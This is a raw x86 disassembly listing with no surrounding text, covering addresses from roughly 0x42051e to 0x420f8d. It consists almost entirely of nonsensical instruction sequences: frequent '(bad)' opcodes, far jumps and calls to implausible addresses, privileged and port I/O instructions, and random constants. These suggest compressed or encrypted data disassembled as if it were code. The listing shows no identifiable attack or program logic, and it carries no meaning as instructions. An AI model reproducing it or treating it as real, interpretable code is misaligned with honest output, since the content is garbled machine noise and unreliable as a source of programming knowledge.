  42051e:	mov    al,ah
  420520:	loope  0x4204fc
  420522:	xchg   DWORD PTR [ebp+0x4f],edx
  420525:	push   cs
  420526:	jp     0x4204f7
  420528:	cli    
  420529:	mov    esp,0xcedd763
  42052e:	iret   
  42052f:	and    DWORD PTR [edi+0x2a],0x9be70e92
  420536:	xchg   edi,eax
  420537:	scas   eax,DWORD PTR es:[edi]
  420538:	fcomp  st(4)
  42053a:	push   0xffffffa3
  42053c:	lods   al,BYTE PTR ds:[esi]
  42053d:	in     al,dx
  42053e:	mov    ah,0x1e
  420540:	mov    dl,0x4c
  420542:	cli    
  420543:	add    BYTE PTR [ebp-0x2e],dl
  420546:	mov    al,ds:0x9ea84e4f
  42054b:	push   edx
  42054c:	or     al,0xb6
  42054e:	(bad)  
  420550:	push   eax
  420551:	or     al,0x5b
  420553:	pop    esi
  420554:	pop    eax
  420555:	call   FWORD PTR ds:0xee8b6ecf
  42055b:	popf   
  42055c:	daa    
  42055d:	xor    ecx,DWORD PTR [eax]
  42055f:	jmp    0x511a:0x2094016
  420566:	stos   BYTE PTR es:[edi],al
  420567:	push   ebp
  420568:	mov    eax,ds:0xfbb82d07
  42056d:	sub    DWORD PTR [ecx+0x499121f5],edx
  420573:	cdq    
  420574:	inc    edx
  420575:	retf   
  420576:	loope  0x4205a1
  420578:	mov    ah,0x55
  42057a:	enter  0x86c8,0x76
  42057e:	sub    eax,esi
  420580:	repnz cmp DWORD PTR [edx],eax
  420583:	push   esp
  420584:	sub    ah,dh
  420586:	jb     0x420600
  420588:	mov    ebx,0x43068fe2
  42058d:	jmp    0xaec532a3
  420592:	dec    ebp
  420593:	inc    esp
  420594:	xor    eax,0x1996d741
  420599:	xchg   DWORD PTR [ebx],esp
  42059b:	add    cl,bh
  42059d:	(bad)  
  42059f:	jmp    0x420537
  4205a1:	fmul   QWORD PTR [ebp-0x36]
  4205a4:	jne    0x420577
  4205a6:	daa    
  4205a7:	cmp    esi,DWORD PTR [ebx+0x1a]
  4205aa:	xchg   ah,al
  4205ac:	dec    BYTE PTR [ebx+0x34]
  4205af:	xchg   BYTE PTR cs:[eax],ch
  4205b2:	xchg   edx,eax
  4205b3:	cmp    al,bl
  4205b5:	les    ecx,FWORD PTR [esi]
  4205b7:	data16 (bad) 
  4205b9:	mov    ds:0xf5855c7e,eax
  4205be:	bound  eax,QWORD PTR [eax+esi*4]
  4205c1:	cmp    esi,DWORD PTR ds:[edx]
  4205c4:	inc    esi
  4205c5:	xchg   DWORD PTR [esi+esi*2+0x11],esi
  4205c9:	sbb    al,0x3e
  4205cb:	push   es
  4205cc:	aad    0xe8
  4205ce:	retf   
  4205cf:	mov    ds:0x4e811971,eax
  4205d4:	dec    eax
  4205d5:	sbb    eax,0x4df826ea
  4205da:	cli    
  4205db:	out    0x44,al
  4205dd:	mov    bh,BYTE PTR [eax+0x2a]
  4205e0:	(bad)  
  4205e1:	and    eax,0x57538933
  4205e6:	iret   
  4205e7:	jle    0x4205dd
  4205e9:	call   0x66b:0xbb69c86c
  4205f0:	mov    edi,0x4236cd9d
  4205f5:	dec    esp
  4205f6:	ret    
  4205f7:	or     DWORD PTR [esi],eax
  4205f9:	test   al,0x8d
  4205fb:	xchg   edx,eax
  4205fc:	pushf  
  4205fd:	or     al,0x2d
  4205ff:	xor    DWORD PTR [ebx+0x28],0xffffffd5
  420603:	jmp    0x760ae313
  420608:	sub    bl,BYTE PTR ds:[ecx]
  42060b:	push   edx
  42060c:	dec    ebx
  42060d:	mov    bh,BYTE PTR [eax+edi*1+0x99]
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	pop    ebp
  420681:	(bad)  
  420682:	xor    bl,cl
  420684:	jne    0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0xa9000001
  42068d:	fbld   TBYTE PTR [ebx]
  42068f:	test   al,0xb5
  420691:	out    0x49,al
  420693:	xchg   ebx,eax
  420694:	adc    ecx,DWORD PTR ds:0x18e2a937
  42069a:	gs ins DWORD PTR es:[edi],dx
  42069c:	retf   0x3da7
  42069f:	cmp    al,0xe5
  4206a1:	aad    0x9c
  4206a3:	arpl   sp,di
  4206a5:	xor    DWORD PTR [eax-0x4648b632],eax
  4206ab:	push   eax
  4206ac:	rcr    BYTE PTR [ecx],1
  4206ae:	ret    0xea26
  4206b1:	add    eax,0x33eeb2ba
  4206b6:	lds    esp,FWORD PTR [esi+0x3f353e0a]
  4206bc:	sub    BYTE PTR [edi-0xca46246],bl
  4206c2:	sbb    BYTE PTR [esi-0x41],ch
  4206c5:	cmp    edx,edi
  4206c7:	aam    0x19
  4206c9:	lahf   
  4206ca:	mov    cl,0x96
  4206cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206cd:	push   ecx
  4206ce:	fldenv [ebx+0x70]
  4206d1:	(bad)  
  4206d3:	xchg   ebx,eax
  4206d4:	xor    bh,BYTE PTR [bp+di]
  4206d7:	jp     0x420691
  4206d9:	in     eax,0x1e
  4206db:	or     ch,bh
  4206dd:	sbb    al,0xd2
  4206df:	leave  
  4206e0:	sub    DWORD PTR [edi+ebx*1+0x20a6d7c1],ecx
  4206e7:	xor    eax,0x56cee7c2
  4206ec:	outs   dx,BYTE PTR ds:[esi]
  4206ed:	mov    cs,WORD PTR [ecx]
  4206ef:	dec    ebx
  4206f0:	popf   
  4206f1:	sahf   
  4206f2:	and    edi,edi
  4206f4:	stos   BYTE PTR es:[edi],al
  4206f5:	dec    edi
  4206f6:	xchg   edx,eax
  4206f7:	mov    ebx,0x19b0e229
  4206fc:	dec    edi
  4206fd:	retf   0xfa24
  420700:	xlat   BYTE PTR ds:[ebx]
  420701:	test   ebx,ebp
  420703:	jmp    0x420763
  420705:	mov    WORD PTR [esp+edi*8+0x119b79fb],?
  42070c:	or     dl,BYTE PTR [edi+0x6d]
  42070f:	jecxz  0x420701
  420711:	xchg   edi,eax
  420712:	outs   dx,DWORD PTR ds:[esi]
  420713:	jae    0x4206bb
  420715:	das    
  420716:	jnp    0x42078d
  420718:	(bad)  
  420719:	retf   0x3b3
  42071c:	jo     0x420776
  42071e:	sub    BYTE PTR [ecx-0x3b],bh
  420721:	call   FWORD PTR [esi]
  420723:	or     al,0x44
  420725:	push   0x51
  420727:	mov    ds:0xb1c920c7,al
  42072c:	mov    edi,0xd14ed93d
  420731:	mov    edi,0x4ab2c164
  420736:	test   DWORD PTR [ebp+0x2b833060],0xa946836b
  420740:	enter  0x69e7,0xe5
  420744:	mov    eax,0x6e1fd81b
  420749:	xchg   edi,eax
  42074a:	push   edi
  42074b:	jle    0x420723
  42074d:	push   esp
  42074e:	fld1   
  420750:	loope  0x4207a3
  420752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420753:	rcl    BYTE PTR gs:[esi+ecx*8],1
  420757:	add    DWORD PTR [edi],esi
  420759:	test   esp,ebx
  42075b:	cmc    
  42075c:	push   0x4a
  42075e:	mov    esp,0xb87b968b
  420763:	test   bl,al
  420765:	js     0x4206ea
  420767:	scas   al,BYTE PTR es:[edi]
  420768:	xchg   esp,eax
  420769:	clc    
  42076a:	nop
  42076b:	rcl    BYTE PTR ds:[edi+0x383a7861],cl
  420772:	xchg   edi,eax
  420773:	test   BYTE PTR [eax+0x51dc1d78],dh
  420779:	sub    al,0x9f
  42077b:	out    0x65,eax
  42077d:	mov    ebp,0xc5ee62e0
  420782:	int    0xc6
  420784:	pop    ds
  420785:	pop    ss
  420786:	loope  0x4207b7
  420788:	bound  ecx,QWORD PTR [esi-0xfec4702]
  42078e:	in     eax,dx
  42078f:	ficomp DWORD PTR [ecx+0x0]
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	pop    ss
  420801:	mov    al,0x8b
  420803:	sub    edi,DWORD PTR [edx+0x5a]
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0xa9000001
  42080d:	push   es
  42080e:	rcl    BYTE PTR [edx+ebp*2-0x41],cl
  420812:	jnp    0x4207ac
  420814:	cld    
  420815:	pop    es
  420816:	es mov esi,0x5760ac16
  42081c:	mov    esp,0xb5f4658
  420821:	out    dx,al
  420822:	jmp    0x5265:0x422a2543
  420829:	xchg   ecx,eax
  42082a:	push   edx
  42082b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42082c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42082d:	pop    esi
  42082e:	out    0x4f,eax
  420830:	xor    dh,BYTE PTR [edi]
  420832:	sub    eax,0x73dc44ea
  420837:	cmp    BYTE PTR [ebp+0x23],bh
  42083a:	add    ah,al
  42083c:	jg     0x42083c
  42083e:	sub    ah,al
  420840:	sbb    edx,esi
  420842:	int3   
  420843:	in     eax,0xd6
  420845:	pop    edi
  420846:	pop    eax
  420847:	and    edi,DWORD PTR [edi-0x72ac1fb6]
  42084d:	sub    al,0x4c
  42084f:	cmc    
  420850:	push   0xffffffb1
  420852:	or     BYTE PTR [ecx-0x57],al
  420855:	in     al,0xed
  420857:	sbb    BYTE PTR [ecx],al
  420859:	mov    al,0xbf
  42085b:	mov    dh,0x8
  42085d:	call   0x50669f4e
  420862:	lods   eax,DWORD PTR ds:[esi]
  420863:	xchg   esi,eax
  420864:	sti    
  420865:	jge    0x420874
  420867:	push   ebp
  420868:	je     0x420896
  42086a:	push   eax
  42086b:	call   0xd21a6c47
  420870:	xor    edi,DWORD PTR [edi+0x7f8d05e6]
  420876:	outs   dx,BYTE PTR ds:[esi]
  420877:	(bad)  
  420879:	(bad)  
  42087a:	pop    eax
  42087b:	ret    0x4bce
  42087e:	mov    eax,0xaf55399a
  420883:	ins    DWORD PTR es:[edi],dx
  420884:	mov    BYTE PTR [ebp-0x2e],dl
  420887:	dec    ebx
  420888:	jl     0x420837
  42088a:	and    eax,0x1335b11b
  42088f:	pop    edi
  420890:	push   0x34
  420892:	adc    eax,esp
  420894:	cld    
  420895:	popa   
  420896:	push   ecx
  420897:	or     al,0x7
  420899:	adc    esi,ebx
  42089b:	stos   DWORD PTR es:[edi],eax
  42089c:	sbb    al,0x70
  42089e:	loopne 0x42084c
  4208a0:	cmp    esi,DWORD PTR [ebx]
  4208a2:	sahf   
  4208a3:	in     al,dx
  4208a4:	dec    edx
  4208a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a7:	xor    eax,edi
  4208a9:	arpl   WORD PTR [esi-0x10],si
  4208ac:	(bad)  
  4208ad:	test   eax,0x8ccbcc85
  4208b2:	icebp  
  4208b3:	jecxz  0x420837
  4208b5:	test   eax,0x92c902ec
  4208ba:	cmp    DWORD PTR [ecx],eax
  4208bc:	xor    BYTE PTR [ebx+0x4c7355b0],ah
  4208c2:	sbb    edx,DWORD PTR [edx+0x5ec5cbac]
  4208c8:	and    al,0x36
  4208ca:	imul   eax,DWORD PTR [esi+eiz*2],0xffffff87
  4208ce:	mov    edx,0x714bbcac
  4208d3:	mov    ebx,0xc8813a17
  4208d8:	or     DWORD PTR [ebp+ebx*8+0x7c84afcb],esp
  4208df:	loop   0x4208bf
  4208e1:	pusha  
  4208e2:	out    0xa1,al
  4208e4:	and    DWORD PTR [esi],0xffffffd9
  4208e7:	inc    ecx
  4208e8:	imul   eax,DWORD PTR ds:0x37ccae5,0xffffffc5
  4208ef:	call   0xa98c72b5
  4208f4:	cli    
  4208f5:	icebp  
  4208f6:	jb     0x420941
  4208f8:	adc    eax,0xbd5e3769
  4208fd:	push   es
  4208fe:	push   0xffffff8c
  420900:	pop    edi
  420901:	sub    al,0xc5
  420903:	push   es
  420904:	mov    esp,0x3621200d
  420909:	push   ss
  42090a:	mov    edi,0x3897e83e
  42090f:	sub    BYTE PTR [eax+eax*1+0x0],ch
	...
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x68
  420981:	(bad)  
  420982:	xchg   esi,eax
  420983:	sar    BYTE PTR [edi+0x5b],0x1
  420987:	add    BYTE PTR ds:0x9b000001,al
  42098d:	jl     0x420910
  42098f:	nop
  420990:	jmp    0x51ae:0xa10f010f
  420997:	loop   0x420990
  420999:	xchg   DWORD PTR [edx],eax
  42099b:	sub    eax,0xedd2fa4e
  4209a0:	mov    ebp,0xceb4742d
  4209a5:	and    al,0xd2
  4209a7:	cmp    eax,0x345b7184
  4209ac:	xor    DWORD PTR [ebp+0x44],edx
  4209af:	lahf   
  4209b0:	sub    BYTE PTR [ebx+0x1036b4fe],ch
  4209b6:	pop    esi
  4209b7:	jbe    0x420989
  4209b9:	add    eax,0x12e60819
  4209be:	mov    DWORD PTR [eax+0x460a3776],ebp
  4209c4:	mov    bh,0x85
  4209c6:	scas   al,BYTE PTR es:[edi]
  4209c7:	inc    ebp
  4209c8:	cli    
  4209c9:	ret    
  4209ca:	popa   
  4209cb:	xchg   edi,eax
  4209cc:	adc    al,0xb4
  4209ce:	xchg   DWORD PTR [edx],esp
  4209d0:	and    dh,dh
  4209d2:	add    ebx,DWORD PTR [eax]
  4209d4:	cmp    dl,ah
  4209d6:	leave  
  4209d7:	loope  0x4209e9
  4209d9:	cmp    al,0x3c
  4209db:	adc    al,BYTE PTR ds:0xb71ff5c4
  4209e1:	fwait
  4209e2:	dec    esi
  4209e3:	cmp    al,0xa1
  4209e5:	es stc 
  4209e7:	icebp  
  4209e8:	xlat   BYTE PTR ds:[ebx]
  4209e9:	cmc    
  4209ea:	xchg   esi,eax
  4209eb:	call   0xe7f12f1e
  4209f0:	lock popf 
  4209f2:	je     0x420a23
  4209f4:	mov    al,ds:0x1142a735
  4209f9:	push   esi
  4209fa:	mov    ecx,0x58293ec5
  4209ff:	sahf   
  420a00:	pop    edi
  420a01:	or     al,0xe3
  420a03:	in     eax,0x3a
  420a05:	jl     0x4209ed
  420a07:	imul   ebp,DWORD PTR [edx],0xbbd3ee58
  420a0d:	cdq    
  420a0e:	jb     0x420a66
  420a10:	int    0x28
  420a12:	push   ebx
  420a13:	or     eax,0x8fd2874d
  420a18:	int    0x7b
  420a1a:	lods   eax,DWORD PTR ds:[esi]
  420a1b:	cmc    
  420a1c:	jnp    0x420a26
  420a1e:	nop
  420a1f:	push   eax
  420a20:	shl    eax,cl
  420a22:	repz sub BYTE PTR [edx-0x74],cl
  420a26:	sbb    ch,bh
  420a28:	sbb    eax,0x89566241
  420a2d:	pop    edx
  420a2e:	(bad)  
  420a2f:	nop
  420a30:	or     dh,BYTE PTR [esi]
  420a32:	sub    DWORD PTR [edx],esi
  420a34:	call   0x9aa2edb7
  420a39:	xchg   esp,eax
  420a3a:	adc    BYTE PTR [ebx-0x226f9c45],ah
  420a40:	fcmovnbe st,st(3)
  420a42:	mov    ?,WORD PTR [ebx-0x2c]
  420a45:	scas   al,BYTE PTR es:[edi]
  420a46:	out    0x1f,al
  420a48:	add    eax,0x5394c2b0
  420a4d:	jb     0x420a08
  420a4f:	xor    al,0x2e
  420a51:	shl    DWORD PTR [edx-0x16],cl
  420a54:	xor    bl,BYTE PTR [ebp-0x7d670423]
  420a5a:	add    BYTE PTR [esp+ecx*2+0x71],cl
  420a5e:	cli    
  420a5f:	mov    ecx,0x843d720
  420a64:	inc    eax
  420a65:	cmp    esi,DWORD PTR [edx-0x18f97e56]
  420a6b:	cmp    dh,BYTE PTR [esi]
  420a6d:	mov    ebp,0x4156160b
  420a72:	inc    ebx
  420a73:	xor    DWORD PTR [ecx],edx
  420a75:	dec    esi
  420a76:	fadd   QWORD PTR [edi-0x7fec2201]
  420a7c:	jl     0x420a66
  420a7e:	push   edi
  420a7f:	mov    ds:0xad31d0f0,eax
  420a84:	xchg   edi,eax
  420a85:	sbb    DWORD PTR [edi],esp
  420a87:	jg     0x420a0e
  420a89:	stos   BYTE PTR es:[edi],al
  420a8a:	push   esp
  420a8b:	pop    esi
  420a8c:	cwde   
  420a8d:	sbb    BYTE PTR [edx+ecx*2],cl
  420a90:	aas    
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	cli    
  420b01:	mov    esp,0x5c8413a9
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    eax,0xef000001
  420b0d:	jl     0x420b4b
  420b0f:	pop    es
  420b10:	mov    ebx,0x30d3e831
  420b15:	(bad)  
  420b16:	dec    esp
  420b17:	outs   dx,DWORD PTR ds:[esi]
  420b18:	aaa    
  420b19:	mov    dl,0x99
  420b1b:	add    eax,0x18b0385c
  420b20:	shr    BYTE PTR [eax+0x5c7f5434],0x62
  420b27:	sub    ch,al
  420b29:	mov    ecx,0x45c57abc
  420b2e:	xchg   edi,eax
  420b2f:	mov    ah,0xc1
  420b31:	ss (bad) 
  420b33:	xchg   esp,eax
  420b34:	mov    al,0xc8
  420b36:	add    eax,0x6cbc573a
  420b3b:	add    edx,DWORD PTR [edi+eiz*4+0x3f]
  420b3f:	scas   eax,DWORD PTR es:[edi]
  420b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b41:	dec    ecx
  420b42:	std    
  420b43:	jl     0x420b8d
  420b45:	loop   0x420b68
  420b47:	adc    eax,0x7e3f7da4
  420b4c:	adc    bh,BYTE PTR [ecx-0x66]
  420b4f:	bnd jge 0x420b59
  420b52:	fbstp  TBYTE PTR [ecx]
  420b54:	dec    eax
  420b55:	in     al,dx
  420b56:	in     al,dx
  420b57:	ss repnz shl ebx,cl
  420b5b:	in     eax,dx
  420b5c:	pop    esi
  420b5d:	fmulp  st(4),st
  420b5f:	sbb    eax,0xcfd0c315
  420b64:	fisub  DWORD PTR [eax+0x27]
  420b67:	inc    esp
  420b68:	les    ebp,FWORD PTR [ebp-0x5]
  420b6b:	mov    ds,WORD PTR [edi+0x55]
  420b6e:	inc    esp
  420b6f:	out    0x6f,al
  420b71:	pop    ebp
  420b72:	iret   
  420b73:	pushf  
  420b74:	mov    cl,0xe6
  420b76:	mov    DWORD PTR [ebx+0x65120d03],esp
  420b7c:	enter  0x6cf2,0xdf
  420b80:	xchg   BYTE PTR [edi-0x22c97b59],bl
  420b86:	cdq    
  420b87:	scas   al,BYTE PTR es:[edi]
  420b88:	adc    ebx,DWORD PTR ds:0x156892cb
  420b8e:	and    al,0xcd
  420b90:	sub    dl,BYTE PTR [edi]
  420b92:	pusha  
  420b93:	sub    eax,0x179b82d3
  420b98:	xchg   edx,eax
  420b99:	mov    cl,0xad
  420b9b:	gs xor BYTE PTR fs:0xf6b6a4da,al
  420ba3:	xchg   edx,eax
  420ba4:	imul   eax,DWORD PTR [ebx-0x671a7467],0x44
  420bab:	mov    eax,ds:0xb1cec3ad
  420bb0:	cmp    bl,BYTE PTR [eax]
  420bb2:	and    ebp,esi
  420bb4:	es inc esi
  420bb6:	ds mov bh,0xd6
  420bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bba:	call   0xd9ec108a
  420bbf:	sub    dl,BYTE PTR [esi+0x70a357a6]
  420bc5:	ret    0x920
  420bc8:	loopne 0x420b9d
  420bca:	neg    ebp
  420bcc:	fs (bad) 
  420bce:	mov    WORD PTR [ebx],cs
  420bd0:	sub    DWORD PTR [edx],ebp
  420bd2:	dec    esp
  420bd3:	sub    esp,DWORD PTR [ebp+ecx*8-0x2c0a354f]
  420bda:	(bad)  
  420bdb:	es inc esi
  420bdd:	idiv   DWORD PTR [ebx+0x33448bc4]
  420be3:	out    dx,al
  420be4:	popf   
  420be5:	xchg   ebp,eax
  420be6:	pusha  
  420be7:	fidiv  WORD PTR cs:[edx-0x480147c3]
  420bee:	push   ecx
  420bef:	nop    edx
  420bf2:	inc    edi
  420bf3:	push   ebx
  420bf4:	pop    esp
  420bf5:	into   
  420bf6:	or     eax,0x4bad13b8
  420bfb:	aas    
  420bfc:	or     BYTE PTR [edx-0x7f9651ef],ch
  420c02:	push   eax
  420c03:	ins    BYTE PTR es:[edi],dx
  420c04:	mov    DWORD PTR [edi+0x68],0x88211724
  420c0b:	call   FWORD PTR [edx-0x2d]
  420c0e:	and    ah,BYTE PTR [ebx+0xec]
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xe
  420c81:	lock imul esp,DWORD PTR [eax],0xffffff89
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0xf3000001
  420c8d:	in     al,dx
  420c8e:	repnz fcom DWORD PTR [ecx-0x72]
  420c92:	ja     0x420cd1
  420c94:	jmp    0x420cac
  420c96:	out    0xfd,eax
  420c98:	pop    edx
  420c99:	add    al,0x4
  420c9b:	in     al,dx
  420c9c:	(bad)  
  420c9d:	mov    ah,0xe3
  420c9f:	shl    ebx,cl
  420ca1:	push   ecx
  420ca2:	cmp    ch,BYTE PTR [ebx+0x50d2ef86]
  420ca8:	stc    
  420ca9:	and    BYTE PTR [ebx],ch
  420cab:	gs jg  0x420cd0
  420cae:	push   esi
  420caf:	xor    BYTE PTR [ecx+eax*1-0x4ab9526f],bh
  420cb6:	mov    ds:0x4d337b5a,eax
  420cbb:	and    edi,ebx
  420cbd:	(bad)  
  420cbe:	out    0x7c,eax
  420cc0:	(bad)  
  420cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc2:	jg     0x420d04
  420cc4:	(bad)  
  420cc5:	fucomi st,st(3)
  420cc7:	data16 aad 0xaf
  420cca:	adc    DWORD PTR [eax+esi*8+0x72be5eb0],eax
  420cd1:	xchg   DWORD PTR [edi],eax
  420cd3:	or     DWORD PTR [eax+0x47baac69],esp
  420cd9:	mov    bx,WORD PTR [ebp+0x1e]
  420cdd:	xor    BYTE PTR [esi+0x1861277f],ch
  420ce3:	fild   DWORD PTR [edi+0xb]
  420ce6:	sbb    ah,bl
  420ce8:	dec    ebp
  420ce9:	dec    ebx
  420cea:	lahf   
  420ceb:	in     al,0xaf
  420ced:	fs mov ebp,0xe79b2080
  420cf3:	pop    ecx
  420cf4:	fidivr WORD PTR [eax]
  420cf6:	das    
  420cf7:	nop
  420cf8:	in     al,0x0
  420cfa:	and    DWORD PTR [edx],0xc0e893b2
  420d00:	outs   dx,BYTE PTR ds:[esi]
  420d01:	je     0x420d0e
  420d03:	and    eax,DWORD PTR [edi+ebp*8]
  420d06:	not    dh
  420d08:	jns    0x420d04
  420d0a:	pop    ecx
  420d0b:	arpl   WORD PTR [ebx-0x57aa4c28],cx
  420d11:	adc    bh,BYTE PTR [ecx+0x57d906f]
  420d17:	test   al,0x6b
  420d19:	push   0xffffffd1
  420d1b:	mov    dh,0x50
  420d1d:	and    edi,ecx
  420d1f:	enter  0xe24f,0x90
  420d23:	ror    edx,cl
  420d25:	(bad)  
  420d26:	aas    
  420d27:	dec    ecx
  420d28:	imul   edi,eax,0x430c8efd
  420d2e:	inc    esi
  420d2f:	ficom  WORD PTR es:[ecx+0x3e]
  420d33:	in     eax,0x0
  420d35:	mov    ecx,eax
  420d37:	mov    ecx,0xe9d5e772
  420d3c:	xchg   BYTE PTR [ebp-0x5f7adadd],dh
  420d42:	mov    WORD PTR [eax+0x69157fc],ds
  420d48:	fwait
  420d49:	shl    BYTE PTR [eax],cl
  420d4b:	add    bl,dl
  420d4d:	shr    esi,1
  420d4f:	mov    eax,ds:0xc6341aee
  420d54:	(bad)  
  420d55:	les    ebp,FWORD PTR [edx]
  420d57:	pop    ebx
  420d58:	or     dl,BYTE PTR [ebx]
  420d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d5b:	adc    BYTE PTR [esi+0x46a8834d],dh
  420d61:	call   0xb11d:0xf767e018
  420d68:	ret    
  420d69:	pop    ecx
  420d6a:	push   0x6d
  420d6c:	push   0x36
  420d6e:	or     ah,BYTE PTR [ecx-0x18fdfec8]
  420d74:	xor    al,0xdb
  420d76:	pop    esi
  420d77:	cli    
  420d78:	push   ebx
  420d79:	add    ebp,eax
  420d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d7d:	mov    ds:0xa93f0dd4,al
  420d82:	xchg   esi,eax
  420d83:	gs pop edi
  420d85:	dec    esi
  420d86:	or     eax,0xf3cf5b1f
  420d8b:	fwait
  420d8c:	jge    0x420e00
  420d8e:	push   esp
  420d8f:	inc    edx
  420d90:	cli    
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x50a80935
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x65000001,al
  420e0d:	adc    al,0x54
  420e0f:	icebp  
  420e10:	add    eax,0x66f59569
  420e15:	loop   0x420e33
  420e17:	stos   BYTE PTR es:[edi],al
  420e18:	mov    ds:0x250d7db4,eax
  420e1d:	lods   eax,DWORD PTR ds:[esi]
  420e1e:	sbb    eax,0xd02e4fa5
  420e23:	fwait
  420e24:	dec    esp
  420e25:	fs pop ss
  420e27:	stos   DWORD PTR es:[edi],eax
  420e28:	daa    
  420e29:	call   0x66d4:0xaebf9195
  420e30:	loope  0x420e49
  420e32:	(bad)  
  420e33:	imul   DWORD PTR [ebp+0x22c5848f]
  420e39:	sub    al,0xa2
  420e3b:	mov    cl,0x8d
  420e3d:	jle    0x420e2a
  420e3f:	cmp    eax,0x82b54d0b
  420e44:	and    dl,bl
  420e46:	nop
  420e47:	xrelease mov DWORD PTR [ecx+ebx*2],eax
  420e4b:	cmp    BYTE PTR [esi],dh
  420e4d:	mov    ebp,0xa2086bd9
  420e52:	loop   0x420e6e
  420e54:	in     eax,dx
  420e55:	bound  edi,QWORD PTR [ebx]
  420e57:	sub    BYTE PTR ds:0x2d244c09,dh
  420e5d:	and    BYTE PTR [esi+0x45],bl
  420e60:	stos   BYTE PTR es:[edi],al
  420e61:	cmp    DWORD PTR [ecx-0x525dccce],ecx
  420e67:	mov    ah,0xc6
  420e69:	add    esp,DWORD PTR [ebx+0x46aab628]
  420e6f:	in     al,0xba
  420e71:	mov    ebx,0xdc0a513c
  420e76:	outs   dx,BYTE PTR ds:[esi]
  420e77:	or     dh,BYTE PTR [eax-0x2b]
  420e7a:	xchg   edx,eax
  420e7b:	dec    edx
  420e7c:	pop    DWORD PTR [ebx+0x6f29b847]
  420e82:	adc    DWORD PTR [eax+0x36],edx
  420e85:	cmc    
  420e86:	cli    
  420e87:	out    dx,al
  420e88:	shl    DWORD PTR [edi],cl
  420e8a:	out    0xbd,al
  420e8c:	jmp    0x420e44
  420e8e:	and    DWORD PTR [edx],esi
  420e90:	gs dec edx
  420e92:	aas    
  420e93:	dec    ebx
  420e94:	xchg   esi,eax
  420e95:	or     BYTE PTR [edx-0x4443168f],bl
  420e9b:	xor    BYTE PTR [ebx-0x80],dh
  420e9e:	bound  esp,QWORD PTR [ebp+0x74a4341]
  420ea4:	nop
  420ea5:	or     eax,0xe2368025
  420eaa:	icebp  
  420eab:	sub    bh,bh
  420ead:	leave  
  420eae:	out    0xf1,al
  420eb0:	xchg   esi,eax
  420eb1:	aad    0xbd
  420eb3:	mov    ch,0xdf
  420eb5:	mov    ah,0x17
  420eb7:	adc    eax,0x2028733a
  420ebc:	in     al,0xe9
  420ebe:	lahf   
  420ebf:	adc    eax,0x5bb717ed
  420ec4:	jo     0x420e8b
  420ec6:	mov    gs,WORD PTR ds:0x8c816e34
  420ecc:	xor    BYTE PTR [esi+0x4b],al
  420ecf:	xchg   ebx,eax
  420ed0:	push   ss
  420ed1:	jb     0x420e81
  420ed3:	not    bl
  420ed5:	lods   al,BYTE PTR ds:[esi]
  420ed6:	sub    BYTE PTR [eax-0xc],bl
  420ed9:	test   eax,0x29634c62
  420ede:	repz cmp edi,ecx
  420ee1:	aad    0xe6
  420ee3:	jo     0x420eb5
  420ee5:	jo     0x420ee6
  420ee7:	xor    eax,0x737af314
  420eec:	push   0x13
  420eee:	imul   ecx,DWORD PTR [eax+0xf984e6f],0x43
  420ef5:	dec    ebx
  420ef6:	dec    esi
  420ef7:	leave  
  420ef8:	sti    
  420ef9:	push   ds
  420efa:	ret    
  420efb:	lods   eax,DWORD PTR ds:[esi]
  420efc:	stos   DWORD PTR es:[edi],eax
  420efd:	std    
  420efe:	inc    ebx
  420eff:	sbb    al,0x80
  420f01:	or     eax,0xbdb02422
  420f06:	fwait
  420f07:	and    BYTE PTR [eax-0x1f],bl
  420f0a:	popa   
  420f0b:	pop    edi
  420f0c:	mov    ch,0x63
  420f0e:	lea    esp,[eax]
  420f10:	jg     0x420f12
	...
  420f72:	add    BYTE PTR [eax],al
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x202a6dde]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0xfc000001
  420f8d:	sbb    eax,0xdc80bf9d
